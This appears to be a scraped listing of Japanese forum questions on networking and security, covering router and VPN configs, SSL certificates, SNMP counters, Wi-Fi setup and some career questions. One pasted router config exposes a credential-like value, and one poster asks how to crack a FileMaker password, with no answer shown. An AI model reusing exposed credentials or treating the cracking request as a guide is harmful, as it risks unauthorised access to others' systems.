loss, time 4006ms
衆議院事務局がまとめた調査報告書によると、28台のパソコンと4台のサーバーがウイルスに感染し、ネットワークを利用するためのすべての衆議院議員と秘書のIDとパスワードが流出し、8月24日から9月7日までの間、メールなどが盗み見されていた可能性があるとしている というニュースを見たのですが、 メールサーバーの中でも、暗号化されているようにして メールをやり取りすればよいと思うのですが、 国会議員は暗号メールを使っていないのでしょうか？ また、 皆様の、お勧めの暗号メールソフトは何でしょうか？
Win2008に付属のIIS７に証明書会社発行の証明書をインストールすると、 下記のエラーが発生しインストールすることができません。 CertEnrool::CX509Enrollment::P_InstallResponse: ASN1 タグの値が間違ってます。0x8009310b（ASN:267） IISマネージャを開き サーバ証明書を選択し、 証明書の要求の完了．．を選択し、 証明書会社からいただいた証明書ファイルを選択し インストールを実行すると エラーが発生いたします。（画像添付） サーバ証明書会社では、サポートをしていないと言われました。 また、色々なサイトを検索しても解決できませんでした。 同様なトラブルに遭遇された方がいたらアドバイスをいただけたらとおもいます。 よろしくおねがいいたします。
ルータ　から　TA(MN128)へのINSダイアルアップ接続方法について 仕事で、接続元のお客がTAからルータに代替する話がでてるのですが 現在使ってるTA（MN128）が大昔に導入したもので誰も使用方法が分かりません。 また、私自身がネットワークに詳しくないてこまってます。 こちら側のTA設定を変更しないで、ルータからINSダイアルアップは可能ですか？ また、接続可能な時、以下の設定がTA にある場合にお客のルータ設定に必要な情報として 情報として伝えればいいですか？ ※お客の着信番号認証はしてないみたいです。 ※IP等は質問様に、aaa等の英字にしてます。 ip address aaa.bbb.ccc.15/24 ip dhcp server off ip dns relay off ip filter 28 reject dns qtype 6 ip filter 29 restrict out * * tcpfin * * remote * ip filter 30 restrict out * * * * 137-139 remote * ip filter 31 restrict out * * * 137-139 * remote * ip filter 32 restrict out * * udp 137 domain remote * ip las accept off ip ras accept on ip ras address aaa.bb.ccc.ddd ～ remote 1 answer channel 1b remote 1 answer permit on remote 1 answer schedule terminate off remote 1 call schedule terminate off remote 1 call schedule channel channel 1bppp remote 1 disconnect change terminate off remote 1 limit charge 0/7 remote 1 limit count 0/60 remote 1 limit reconnect permit on remote 1 receive id nex#passw0rd remote 1 receive password ????? encrypted 宜しくお願い致します。
会社のRTX1200で、ネットボランチDNSサービスを使用して自宅よりPPTPVPN接続をしたいのですが、「エラー：629」が表示して接続することが出来ません。rtx1200の設定が悪いのかPC側なのかわからず困っています。ちなみにIPSECでの接続は出来ています。RTX1200の設定を以下に貼り付けますので見ていただけないでしょうか？ ip route default gateway pp 1 ip lan1 address 192.168.100.1/24 ip lan1 proxyarp on ip lan1 secure filter in 100000 100001 100002 100003 100004 100005 100006 100007 100099 pp select 1 description pp PRV/PPPoE/0:ocn pp keepalive interval 30 retry-interval=30 count=12 pp always-on on pppoe use lan2 pppoe auto disconnect off pp auth accept pap chap pp auth myname *********** ************** ppp lcp mru on 1454 ppp ipcp ipaddress on ppp ipcp msext on ppp ccp type none ip pp secure filter in 200003 200020 200021 200022 200023 200024 200025 200030 200032 200080 200081 200082 200083 200084 ip pp secure filter out 200013 200020 200021 200022 200023 200024 200025 200026 200027 200099 dynamic 200080 200081 200082 200083 200084 200098 200099 ip pp nat descriptor 1000 netvolante-dns hostname host pp server=1 **************.aa0.netvolante.jp pp enable 1 pp select anonymous pp bind tunnel91-tunnel94 pp auth request mschap-v2 pp auth username ************ *********** ppp ipcp ipaddress on ppp ipcp msext on ppp ccp type mppe-any ppp ccp no-encryption reject ip pp remote address pool 192.168.100.72-192.168.100.79 ip pp mtu 1280 pptp service type server pp enable anonymous tunnel select 21 description tunnel ********** ipsec tunnel 1 ipsec sa policy 1 1 esp aes-cbc sha-hmac ipsec ike keepalive use 1 auto heartbeat ipsec ike local address 1 192.168.100.1 ipsec ike nat-traversal 1 on ipsec ike pre-shared-key 1 text ****************** ipsec ike remote address 1 any ipsec ike remote name 1 ************ key-id ipsec ike xauth request 1 on 1 ip tunnel tcp mss limit auto tunnel enable 21 tunnel select 91 tunnel encapsulation pptp pptp tunnel disconnect time 1800 tunnel enable 91 tunnel select 92 tunnel encapsulation pptp pptp tunnel disconnect time 1800 tunnel enable 92 tunnel select 93 tunnel encapsulation pptp pptp tunnel disconnect time 1800 tunnel enable 93 tunnel select 94 tunnel encapsulation pptp pptp tunnel disconnect time 1800 tunnel enable 94 ip filter 100000 reject * * udp,tcp 135 * ip filter 100001 reject * * udp,tcp * 135 ip filter 100002 reject * * udp,tcp netbios_ns-netbios_dgm * ip filter 100003 reject * * udp,tcp * netbios_ns-netbios_dgm ip filter 100004 reject * * udp,tcp netbios_ssn * ip filter 100005 reject * * udp,tcp * netbios_ssn ip filter 100006 reject * * udp,tcp 445 * ip filter 100007 reject * * udp,tcp * 445 ip filter 100099 pass * * * * * ip filter 200000 reject 10.0.0.0/8 * * * * ip filter 200001 reject 172.16.0.0/12 * * * * ip filter 200002 reject 192.168.0.0/16 * * * * ip filter 200003 reject 192.168.100.0/24 * * * * ip filter 200010 reject * 10.0.0.0/8 * * * ip filter 200011 reject * 172.16.0.0/12 * * * ip filter 200012 reject * 192.168.0.0/16 * * * ip filter 200013 reject * 192.168.100.0/24 * * * ip filter 200020 reject * * udp,tcp 135 * ip filter 200021 reject * * udp,tcp * 135 ip filter 200022 reject * * udp,tcp netbios_ns-netbios_ssn * ip filter 200023 reject * * udp,tcp * netbios_ns-netbios_ssn ip filter 200024 reject * * udp,tcp 445 * ip filter 200025 reject * * udp,tcp * 445 ip filter 200026 restrict * * tcpfin * www,21,nntp ip filter 200027 restrict * * tcprst * www,21,nntp ip filter 200030 pass * 192.168.100.0/24 icmp * * ip filter 200031 pass * 192.168.100.0/24 established * * ip filter 200032 pass * 192.168.100.0/24 tcp * ident ip filter 200033 pass * 192.168.100.0/24 tcp ftpdata * ip filter 200034 pass * 192.168.100.0/24 tcp,udp * domain ip filter 200035 pass * 192.168.100.0/24 udp domain * ip filter 200036 pass * 192.168.100.0/24 udp * ntp ip filter 200037 pass * 192.168.100.0/24 udp ntp * ip filter 200080 pass * 192.168.100.1 esp * * ip filter 200081 pass * 192.168.100.1 udp * 500 ip filter 200082 pass * 192.168.100.1 udp * 4500 ip filter 200083 pass * 192.168.100.1 tcp *
zone alarmが新しくなったようでupdateしたらネットが繋がらなくなりました。 バージョンは ZoneAlarm Free Firewall version: 10.1.065.000 vsmon version: 10.1.065.000 Driver version: 10.1.065.000 ZoneAlarm Browser Security: 1.5.350.0 ZoneAlarm ForceField Spyware Scanner: 1.5.350.0 ZoneAlarm ForceField Anti-Phishing Database: 1.2.104.0 ZoneAlarm ForceField Spyware Sites Database: 04.155 です。 zone alarmを切ればネットに繋がります。 どうしたら繋がるのでしょうか？ Firefoxだけ繋がるのですが・・。
PHPでWebアプリを作成しているのですが，ログイン等の個人情報に関するページへアクセスおよびサーバからの返却の際に暗号化したいと思っています． その場合，SSLを使うべきだと思うのですが，SSLを行う場合どうしたらいいのでしょうか． apache + phpで動かしているのですが，どう変更すればできるのか分かっておりません． ※できれば，猿でも分かる感じで説明していただけると助かります．自作サーバでhttpsのwebdavは構築したことがあるので，なんとなくのイメージは分かります．
　こんにちは。 　家の中で無線ＬＡＮを使ってルーターから複数のＰＣを接続しています。 　一台のNotePCが急に繋がらなくなりました。 　原因は良く分かりませんがVirus対策でスキャンをかけたのが原因のようです。 　それはいいとしても、再度設定したいのですが、他のPCから、SSID、パスワード 等（ＷＥＰ方式）をエクスポートして、このPCにインポートするような方法ってあるの でしょうか。 　宜しくお願い致します。
こんばんわ EMチャージという1時間定額で使用できる通信端末を購入した結果、 1つの問題に直面いたしました。 このEMチャージを1時間定額で利用する場合、端末をUSBで接続した後、EMチャージのサイトへ接続して１時間定額にプラン登録するまでは従量課金となっています。 1時間利用後は毎回従量課金に戻りますので、都度使用前にプラン登録が必要です。 一応、EMチャージのサイトへの接続のみであれば従量課金中の通信料無料となるそうです。 私が直面している問題とは、 プラン登録をする前にPCがEMチャージのサイト閲覧以外の通信をしてしまい従量課金分も料金が発生することです。 思いつく範囲で、WINDOWSアップデートの自動更新をオフにし、セキュリティソフトの自動更新もオフにしました。 しかし、PCに疎い私が思いつく範囲以外での通信も生じている筈です。 簡単な設定で、EMチャージのサイトでプラン登録をするまでの間は、それ以外一切通信をできないようにする事はできますか？ OSはWINDOWS7を使用しています。 詳しい方、お手数ですが知恵を貸してください。
パソコンAの共有フォルダを パソコンBのネットワークドライブとして設定していますが、 パソコンBのネットワークドライブを共有設定にして、 外部から参照できるようにしたいのですが、 ネットワークドライブには共有設定がありません。 つまり、 パソコンAの共有フォルダ ｜ パソコンBのネットワークドライブの共有 ｜ 他のパソコンから参照 と、経由的には面倒くさいことをしていますが、 技術的に可能でしょうか？
今働いている会社ではどうやらウィルスソフトやファイアウォールなどは個別のPCでは設定しなくていいらしいのですが、どうやってそういう設定を行っているのでしょうか？おそらく自社のサーバ内で何らかの設定をしているものと思われますが、どうやったらそういうことができるのでしょうか？ 自宅のサーバで設定してみたいのですが、初心者なのでよくわかりません。自社も自宅もCentOSです。 なるべくわかりやすい回答をお待ちしております。
仕事上ファイルメーカー 使用してます。 ファイルメーカー パスワードをメモしてない人が亡くなり仕事できないです！以前のパスワードから勝手に変更してるみたいで・・・解読方法あれば早急に教えてください。
PCなどのネットワークとは別に、インターネットに繋がなくても良い機器で ホームネットワークを構築しようとしています。 この場合のネットワークの呼び名はイントラネットでいいんですかね？ 検索してもあまり該当するようなケースがなく用語探しから戸惑っています。 用途としては、802.11nで動画をストリーミングしたり、移動させたいと考えています。 接続させる機器は、 1.TV 2.BDレコーダー 3.RecBOX 4.NAS 5.PC1 (LAN1, LAN2) 6.PC2 (LAN1, LAN2) です。 5,6のPCはNICを２つ着けて、LAN1を今使っているインターネットに繋がっているネットワークに そしてLAN2を今回作ろうと思っている外部に繋がらなくて良いネットワークに 繋げようと思っています。 NASには外部からアクセスされないようにしようと思った結果、素人ながらの考えで このような案になりました。 TVなどがインターネットにアクセスできない事は自分の場合それほど デメリットを感じませんでしたので、なるべく外部から切り離したつもりですが このような構成を実現する為の知識が不足しておりまして、とても不安なので 質問させていただきました。 ちなみに無線LANブロードバンドルーターのWR8700Nを用意しました。 1.PC2からNASへのファイルの移動は許可し、NASからPC2への移動は禁止する 　と言うような事は可能でしょうか？ 　その場合、WR8700Nに直接繋ぐだけで良いのでしょうか、それともWR8700N 　以外にスイッチなどの機器が必要になるのでしょうか？ 2.PC1はNASへのアウトバウンド、インバウンド共に可能にしたいのですが、その場合 　外部からPC1を踏み台にされてNASへアクセスさせないためにはどのような方法が 　ありますか？ 　NASのアクセス先のプライベートIPアドレスをWR8700Nで指定しておくだけでは 　踏み台にされた場合は駄目ですよね・・・？ 3.これは上2つの質問にもかかわる事なのですが、WR8700Nの設定をどのように 　するのがいいのかです。 　PPPoEルータモード、ローカルルータモード、無線LANアクセスポイントモードと 　ありますが、パケットフィルタ機能を利用したかったためローカルルータ 　モードで設定しようとしました。 　しかし、初期設定で「接続先設定」という項目が出てきてWAN側のDHCPなど 　の設定をするように求められてしまい、(WAN側には何も繋がないつもり 　でしたので)止めてしまいました。 　改めて、アクセスポイントモードで設定を続けようとしましたが 　この設定だと別途ルーターかスイッチを購入しなくてはならないのかと 　思い、そこで断念してしまいました。 長くなりましたが、素人発想の案なので全然的を射ていないかもしれませんが 助言やアドバイスをお願いします。 また、初心者用のネットワークの本などがあれば読んで勉強していくつもりです。 よろしくお願いします。
今日、次回更新(来年1月)は行いません。 と会社に報告しました。 長期期間設計構築が決まりそうだったため。 また、携わりたい仕事があったため。 社長に話をしたところ、 自分：「来年の1月更新は行いません」 社長：「お客様面接行った後に何行ってるんだ？」 社長：「何で面接に行く前に言わない？」 といわれました。 「そんなことするなら、今すぐ辞めてくれといわれ、離職票を書かされました。」 また、「これは合意やぞ？いいな？」どす声で言われ ビビッて「はい」といってしまいました。 やはり、就業してから1ヶ月で抜けるというのは、かなり気がひけて 今日言ってしまいました・・・。 今回一身上の都合で、辞めることになったのですが 一身上の都合で辞めない方法もあったのでしょうか？ 契約期間は、７がつから10月中旬で、10月から1月が次期契約期間でした。
普段はssh接続で操作しているサーバー(Ubuntu 8.04)があり、必要に応じてsftpでファイルをダウンロードしていました。 ところが最近からssh接続はできるのに、sftpで接続するとタイムアウトになってしまうようになりました。 ssh接続には「PuTTy」、sftp接続には「FileZilla」を使用しています。 特にFileZillaの設定を変えた訳でもありません。 sshでは接続できるだけに、とても不思議です。 ダメ元でsshの再起動、OSの再起動、そしてFileZillaの最新版へのアップデートは行いましたが、変化なしでした。 非常に困っています。助けていただけないでしょうか。
４０代５０代のネットワークエンジニアで運用保守をやっている人っていますか？ ４０代５０代で保守をやっている人って、設計・開発ができないか、やらない人ですよね。 そういう人っているんですか？ 一生運用と保守をやっている人。 もし、開発よりも楽な道なら俺もそれを考えているんですけれども・・。
Dell Inspiron 1526 をウィンドウズ７にアップグレードしました。 自宅のルーターではいままでどおり、ネット接続が出来ます。 しかし、職場のルーターとは何回試みてもできません。 職場のルーターはバッファローAirStationWLA2G54です。 デルPCで、ネットワーク接続をクリックし、接続は使用可能ですと出ます。 電波状況が強いアンテナマークをクリック、ルーターの裏に記載している000D・・・・をセキュリティキーの欄に入力しても、数秒経過すると正しくないとメッセージがでます。 AOSSのボタンを押して試しても同様です。ルーターが古いタイプだからなのでしょうか？ 他のマックブックでも同じ現象なので、マックはランケーブルでルーターと接続して使用しています。 どうか宜しくお願いします。
皆様のお知恵を拝借できればと思い、書き込みます。 下の図のように、VPNは構築できています。 192.168.1.2のPCから、\\192.168.1.3\(共有フォルダを開くような)感じで開いて、 10.112.0.2の共有フォルダを開きたいと考えてます。 ※要は、192.168.1.3を見てるつもりが、実は10.112.0.2を見ているように見せたい。 ＲＯＵＴＥＲ１には以下のような記述をしてあります。 ip route 192.168.1.3 gateway tunnel 1 ip tunnel nat desciptor 1 nat descriptor type 1 nat nat descriptor address outer 1 10.112.0.2 nat descriptor address inner 1 192.168.1.3 nat descriptor static 1 1 10.112.0.2=192.168.1.3 こんな設定を書いているのですが、うまくいきません。 どなたか実績などございましたら、アドバイスの程、よろしくお願いします。 　　　　　　　　　　　　　　Internet　 　 Internet 　　　　　　　　　　　　　　　｜　　　　　　　　　　　　　　｜ 　　　　　　　　　　　　　　　｜　　　　　　　　　　　　　　｜ 　　　　　　　　　　　　　　　｜　　　　　　　　　　　　　　｜ 　　　　　　　　　　　　　　　｜　　　　　　　　　　　　　　｜ 　　　　　　　　　　　　　　　｜　　　　　ＶＰＮ　　　　　　｜ 　　　　　　　　　　　　　　　｜　＃＃＃＃＃＃＃＃＃＃＃＃　｜ 　　　　　　　　　固定ＩＰ　　｜　＃　　　　　　　　　　＃　｜ 　　　　　　　　　　　＋－－－＋－－－＋　　　　　　＋－－－＋－－－＋ 　　　　　　　　　　　｜ＲＯＵＴＥＲ１｜　　　　　　｜ＲＯＵＴＥＲ２｜ 　　　　　　　　　　　＋－－－＋－－－＋　　　　　　＋－－－＋－－－＋ 　　　　　192.168.1.1/24 　｜　　　　　　10.112.0.1/29 ｜　 　　　　　　　　　　　　　　　｜　　　　　　　　　　　　　　｜ 　　　　　　　　　　　　　　　｜　　　　　　　　　　　　　　｜ 　　　　　　　　　　　＋－－－＋－－－＋　　　　　　＋－－－＋－－－＋ 　　　　　　　　　　　｜　ＰＣ　１　　｜　　　　　　｜　ＰＣ　２　　｜ 　　　　　　　　　　　＋－－－＋－－－＋　　　　　　＋－－－＋－－－＋ 　　１９２．１６８．１．２　　　　　　　　１０．１１２．０．２
もし一つのネットワーク上に（MACアドレス偽装などによって）MACアドレス・ホスト名が全く同じコンピュータが２台あるとき、 DHCPでIPアドレスを割り振っていた場合、それらのコンピュータは同じIPアドレスを割り振られるかと思うのですが、 このときネットワークの管理者や、他のコンピュータからはどのように見えるのでしょうか。 またこの場合、この２台とも正常な通信が可能なのでしょうか。 お教えください。
あるサイトでzip圧縮されているファイルへのリンクがあり、 クリックした後、「保存」して デスクトップで+Lhacaで解凍する分には問題ないし、 デスクトップのzipファイルをダブルクリックしても 中身を見ることができますが、 ここでお伺いしたいのが、 リンクをクリックした時に「保存」ではなく「開く」にすると、 『圧縮(zip形式)フォルダは無効であるか、または壊れています。』 というエラーが表示されます。 他サイトで同じくzip圧縮されているものを「開く」と 中身が見れます。 この違いがなんなのか、無効のエラーが出る原因が知りたいです。 どうぞよろしくお願い致します。
PSPから検出されたウィルスについてです。 昨日、友達のPSPを自分のパソコンに接続したらウィルスが検出されました。 Win32.Troj.Vaklik.111829 Win32.Hack.Rbot.(kcloud) の二種類です。 これらは、パソコンにどのような害を与えるウィルスなんでしょうか？
少し前に無線ＬＡＮルータを購入しました その後ルータモードで接続し、ＰＳＰもつなぐことが出来ました そしてＰＳＰで「ＭＰＯ＋」をやろうとしたのですが、 ポートチェック中にエラーが出て「現在のネットワーク環境ではゲームの作成が出来ません」とでてきて ゲームの作成が出来ませんでした そのあと自分で調べてみて、ポートの開放が必要だとわかったんですが、開放を行っても 一向に解消されませんでした。　 そこで二重ルータを疑い、コマンド　プロンプトにて「ipconfig/all」と打ち込んだところ3？つほどＩＰアドレスが出てきました そこでルータをアクセスポイントモード（ブリッジモード？）に変更し設定しましました しかしＰＣではインターネットに接続できているのにかかわらず、ＰＳＰではＩＰアドレスの取得がタイムアウトになったり、固定すればＤＮＳエラーになってしまいます 無線ＬＡＮのステータスではインターネット接続という欄にルータモードでは出ていたＩＰアドレスやサブネットマスクなどの情報も消えています 無線ＬＡＮはＭＺＫ－Ｗ300ＮＨ2です 回線はおそらくＣＡＴＶです モデムのところにはＮＥＣと書いてありますが、私にはよくわかりません この環境でゲームの作成は出来るのでしょうか？ 　
最近、ネットワーク関連の部署に配属されて、日々、困っています。 スタック接続でのＬ3スイッチに設定する機器名について質問です。 CiscoのC3750X-24T-Sを2台でスタック接続という話がでています。 構築はベンダーさんにお任せです。 A. sampleL3-01 B. sampleL3-02 とＬ3スイッチの名前を決めました。 ベンダーさんからでてきた接続図には、機器名として「sampleL3-01」だけが図面に載っていました。 これは、 1　スタック接続の場合は、1台のスイッチに見えるので、「sampleL3-01」（マスターとかいう方？）だけが見える感じになるから。 2　とわいっても、当然機器自体には、それぞれＡ、ＢそれぞれのsampleL3-01、sampleL3-02の名前が設定される（もしかして、名前さえも同じ名前が設定される？） こんな細かなところも判らないのでですが、ベンダーさんにお任せとはいえ、モヤッとするので、教えていただけると助かります。 どうぞ、よろしくお願いいたします。
現在Link StationをLANケーブルで複数のPCからアクセスするようにし使用しています。（PCとLink Station間にはサーバーPC等は入っていません） そのLink Station内にあるいくつかのフォルダのみ特定のPCからしかアクセスできないようにしたいと考えています。 できれば、アクセスできるPCのIPアドレスで区別できればと考えていますがそのようなことは可能でしょうか。 なお、IPアドレスは各PCとも個別のアドレスが振られており自動取得等ではありません。
無線LANの設定でAOSSを使っているのですが セキュリティをWEPからWPA-AESに変更しました。 AOSSでWPA-AESというのは安全なのでしょうか？ ちなみに暗号キーはWEPのままと同じです。 電波のところには鍵のマークがついています。 ルータはBUFFALO WLI-CB-G54Sです。
楽天ショッピングの会員になろうとしたら、「このメールアドレスはすでに使われています」 とかえってきました。誰かに使われているのでしょうか？ 楽天の、メアドを消すことはできますか？教えてください。お願いします。
昨日の毎日新聞なのですが、衆参両院へのサイバー攻撃関連の記事で、「メールに添付された画像を開くとウィルスに感染する仕組み」というくだりがありました これは、特定の形式の画像ファイルを開くとウィルスがダウンロード&実行されてしまうというセキュリティホールが国会で使っているPCのOSにはあるということなのでしょうか? それとも単に、昔からIPAなどでも注意を喚起している、ファイル名に画像形式の拡張子を入れて、拡張子非表示設定のユーザの錯誤を狙ったウィルスの話なのでしょうか? もし前者なら、問題のセキュリティホールのあるOSや画像形式についての情報も教えていただけるとありがたいです
社内のSSL環境を構築しておりますが、私の知識不足のためになかなかうまくいきません。 申し訳ありませんが、ご教授願えますでしょうか？ ---テスト環境--- サーバＡ：www.XXXX.co.jp（Winodws Server 2008 R2 役割：IIS7.5、AD証明書サービス(スタンダート　ルートCA)) サーバＢ：yyy.XXXX.co.jp（Winodws Server 2008 R2 役割：IIS7.5) クライアント１：IE7(WindowsXP)、IE9(Vista)：クライアント証明書あり クライアント２：IE8(WindowsXP)：クライアント証明書なし ---証明書--- サーバＡ（ルートCA認証局） |--サーバＡ：サーバＡルートCAでサーバ証明書発行（IIS用：サイトのバインドに設定しSSLを設定（SSL設定：SSLが必須、クライアント証明書：必須）） |--サーバＢ：サーバＡルートCAでサーバ証明書発行（IIS用：サイトのバインドに設定しSSLを設定（SSL設定：SSLが必須、クライアント証明書：必須）） |--クライアント１：サーバＡルートCAでクライアント証明書発行 ---アクセス--- 　クライアント１→サーバＡのサイト：表示／ＯＫ（正常にサイトを確認できる） 　クライアント２→サーバＡのサイト：表示／ＮＧ（サイトを確認できない）クライアント証明書がないので正しい ※クライアント１→サーバＢのサイト：表示／ＮＧ（403 13のエラーとなり接続できない）クライアント証明書はルートＣＡの証明があるのに接続できない 　クライアント２→サーバＢのサイト：表示／ＮＧ（サイトを確認できない）クライアント証明書がないので正しい なぜサーバＢのサイトへアクセスできないのでしょうか？ルートＣＡの証明書は有効となっているのですが？です。 ちなみにクライアント証明書のCRLは「http://www.XXXX.co.jp/」のcrlの場所となっています。 サーバＢにAD証明書サービスをインストールし既存CAにてルートCAと利用すればよいのはわかるのですが、 インストールなしでできないものでしょうか？サーバを追加するたびにクライアント証明書を要求・発行しなくてもルートで承認している クライアントから接続できないのでしょうか？ 証明書の発行、考えに問題があるのか分からないのですが、なにか回答があれば助かります。
galaxysIIで明るさの設定を しようとしたら 明るさのところが 暗くなっていて選択できなく なっていました。 どうしてでしょうか？？ 
度々すみません、 SNMPの知識が浅く、理解に苦しんでいます。 ifInOctetsとifOutOctetsですが、少し基礎から整理したいと思います。 お付き合い頂けると助かります。 Q1. 先ずこれらが持つ数値データは、「受信した総バイト数」、 「送信した総バイト数」という認識で良いでしょうか？。 Q2. またこれらは「カウンター型」とあるのですが、 例えば1バイトを送信したら1ずつインクリメントされるような イメージでしょうか？。 32bitカウンタの場合、上限（4294967925）を超えると、0に戻ると 下記サイトに記載があります。 http://www.itmedia.co.jp/enterprise/articles/070 … この「4294967925」は「バイト数」なのでしょうか？。 ※およそこの値まで送受信バイト数をカウント可能、という認識です。 Q3. 最終的には、「トラフィック監視」として、 このカウンタを一定間隔で取得し、それがしきい値を超過したら エラーとして通知したいと考えています。 しかしこれが果たして、しきい値として使用できるか、、 整理できず悩んでいます。 というのも、「受信した総バイト数」、という累計値のような表現が 気になっていまして、今回やりたいのは、例えば回線が1Gbpsの上限があり、 ポーリング時に機器のポート使用が800Mbpsを超過している場合に通知したいのです。 （通常は、数十Mbps程度の想定です） 負荷の有無に関わらず、累積でどんどんカウンターが積みあがって、 指定した値を超過したら1回通知して、その後カウンター上限を超えて0に戻り、 また指定した値を超過したら・・という動きだと どうも趣旨が違うような気がするのです。。 以上の3点の認識は正しいでしょうか？。 ご指摘など頂けると大変助かります。 ちなみにNMSがifspeedとの帯域使用率の計算をサポートしてないため、 上記のような対応をせざるを得ない状況なのです・・。 よろしくお願い致します。
現在28歳、無職でネットワークエンジニアへ転職を考えているものです。 未経験・無資格です。 ネットワークエンジニアの将来性ってどうなのでしょうか？ 日本のかなりの企業が、ほぼネットワークの構築を終え、 クラウド化が進む中で、ネットワークの仕事の規模は縮小してきていると聞きました。 ネットワークエンジニアへの転職は、数十年後にリスクがあると聞いたのですが、 どうでしょうか？ あと、ＩＴ業界の中では給料は少ないほうでしょうか？ よろしくお願いします。
以下システムで必要なSSL証明書枚数は3枚で間違いがないか教えていただけないでしょうか？ SMTPサーバー　　　　　　　：smtp.test.jp MAPサーバー　　　　　　　：imap.test.jp squirrelサーバー(webメール)：Squirre.test.jp のサーバーを3台用意し、1台ずつにインストールします。(各サーバーがバラバラの役割を持つ) 通信は全て、SSL/TLSで行います。 1台のサーバーに3つの役割を全て統合して用意するなら、 1枚のSSLを発行するだけで問題ないと思うのですが、 3台のサーバーを用意し、3つのホストネームがあるので、 Common　Nameがそれぞれのサーバーで異なるとおもうので 3枚の証明書を用意する必要があると思っています。 私の考えは間違っていませんでしょうか？ よろしくお願いします。
現在、転職活動中の28歳のものです。 ネットワークエンジニアへの転職を考えています。 スペックは以下のとおりです。 ・前職は一部上場企業のＳＥ（年収４５０万） →仕事の内容は、パッケージ商品の導入コンサル及びカスタマイズ プログラムはしてません（苦手です）。 ・ＩＴ系の資格はもってない。 ・コミュニケーション能力はそれほど高くない。 ・前職で、残業時間がやばすぎて辞めました。 こんな状態なのですが、 未経験・無資格からネットワークエンジニアへの転職は可能でしょうか？ もちろん、資格は今から勉強しようと思ってます。 できれば、年収400万以上希望です。 よろしくお願いします。
社内ネットワークの管理者ですが、社内のセキュリティポリシー上、WEBメールの使用を禁止しています。 現在は、通常のメーラーとしてアウトルックエクスプレスを利用しております。（設定上はhotmail可能ですが現在は一応、問題にはなっていません） Windows７への対応として、メーラーの選定を行っているところですが、WindowsLIVEmailだと、いかにもアカウント設定時に、hotmailを設定して欲しそうな挙動をするので、困っています。 ブラウザでのhotmailやGmailのアクセスは、コンテンツフィルターでふさいでいるのですが、メーラーで「できる」ことが広まるのはセキュリティ上、回避したいのですが。。。 A案）何らかの技術的方法でWindowsLIVEMAILを使いながら、hotmail等へのアクセスを遮断する。（必要であれば、何らかのソフトを導入して抑止することも含め） B案）なんかWebメール非対応のメーラーに乗り換える の２案ぐらいの方向性で、良い方法があったら教えて下さい。
９月にNEC LS550を購入し、 ３か月の無料セキュリティ体験版は付随されてるのですが、 この方面初心者に近いので、その後の選択を悩んでます。 私なりに雑誌やネットで調べ、 ・JUNGLE G Data インターネットセキュリティ　2012　（３年版） ・F-Secure 　インターネットセキュリティ　2012 の２つを候補にあげました。（家にパソコンは１台のみです） 期間と値段で言えば、上記になるのですが。 ３年間をお得と見るべきなのか？等 アドバイスがいただけたらと思います。 勿論、おススメがあれば 併せて、お願いします。
端末の電源を切る操作をすると、再起動されてしまう現象が発生しました。 ＷＯＬを無効にすると、正常に電源が切れる事からマジックパケットが流れて いるのではないかと想定しております。 ただ、このマジックパケットは意図しないもので、どのノードから発信されているのかを 特定したいと考えております。 何か手法がございますでしょうか。宜しくお願い致します。
iPodtouchにwifiのパスワードを入力するときの方法を教えてください
今、韓国に出張中です。 これから韓国出張が多くなります。 インターネットを通して、画像は悪くなるけどテレビを観る方法があると聞きました。 （しかも、無料で） 方法を知っている方がいたら教えてください。
LAN内に2台のメールサーバがありますが、 どうも名前解決ができないようで、その2サーバ間でのメール転送が できなくて悩んでいます。 現状LAN内にDNSサーバがないのですが、 DNSを立てたほうが早いのでしょうか？ それとも、DNSなしで対応可能でしょうか。 main.cfのパラメータにdisable_dns_lookupsというのがあり、 これをYesにするとDNSを見ずにhostsを見てくれるという記事を 見ましたが、この場合他に注意する項目があれば教えてください。 実際にこの項目(disable_dns_lookups)yesにしてみたのですが、 解決に至っておりません。 ちなみに、25ポートのtelnetで直接相手サーバのMTAと 接続することは可能です。 ただ、自サーバのMTAに接続して、そこから相手MTAに登録された アカウント宛にメールが飛ばせない状況です。
hamachiを立ち上げようとすると サーバーがログイン要求を拒否しました。 と出ます。調べてみて C:\Documents and Settings\[USER NAME]\Application Data\Hamachi を消せばいいとありましたが、そのファイルもフォルダも泣くどうすればいいか分かりません。 再インストールも試しました。 OSはXPです、どなたかお願いします。
ひかりプレミアムでネットボランチDNSサービスを登録したいのですが、「エラー：グローバルアドレスのみ登録できます」と表示します。機種はRTX1200です。プロバイダはDIONです。ひかりネクストでは設定出来たのですが、どういう意味でしょうか？素人なのでよろしくお願い致します。
スイッチの各ポートの帯域使用率を取得したいと思い、 SNMPのifInOctetsの値をsnmpwalkで参照しました。 そこには、インターフェース毎に数値（カウンタ？）が入っていました。 この値は、そのポートが受信したバイト数の累計値か何かなのでしょうか？。 「累計」と考えたのは、その数値がポートの最大スペック（1Gbps=128Mバイト）を 超える値が入っていたためです。 128Mバイト以下のバイト数（snmpwalkで参照時点の使用量）が 入っていると思ったのですが・・ この数値はどういった解釈をするものでしょうか？。 アドバイスを頂けると幸いです。
現在DHCPで運用しているネットワークがあります。 振られるIPは１９２．１６８．１．＊＊＊です。 このネットワーク内にパソコン及びIPを持つ機器は10台程度しか無く、 それらに割り振られたIPを調べてみると、１９２．１６８．１．「２～１０」と、若い番号でした。 ここで、新たに接続するパソコン1台に固定のローカルIPを設定したいです。 例えばIP１９２．１６８．１．２００なら、 単純計算で今後ネットワーク内に約200台IPを持つ機器をつながないと、 DHCPにより割り振られたりはしないだろう＝IPが重複することは無いだろうと考えているのですが、 この認識は正しいでしょうか。
おはようございます。 最近、企業とかも防衛でファイアーウォールとか気をつけていると思います。 インターネット経由で害になるようなものを防ぐ仕組みだと思うのですが、具体的に何をやってるのかわかりません・・・。 インターネットの使い始めはファイアーウォールはなかったような気がするし、これって具体的にどんなことをして、何を防いでいるのですか？ ご存知の方いらっしゃいましたら教えてください！！
　コントロールパネルのユーザーアカウント画面で、「ユーザーのログオンやログオフの方法を変更する」をクリックすると「netware用クライアントサービスをアンインストールしてください」と出ますがスタートボタンを押してすべてのソフトを見ても「netware」は見つからず、対処に苦慮しています。 　これについての解決方法を教えてくださいませんか。使用機種はＷｉｎｄｏｗｓ　ＸＰです、最近Ｍｉｋｕｒｏｓｏｆｔ　Office Personal 2007をインストールしました。これが何か関係があるのでしょうか。 　当方、69才で最近パソコンをはじめたばかりです。よろしくお願いいたします。
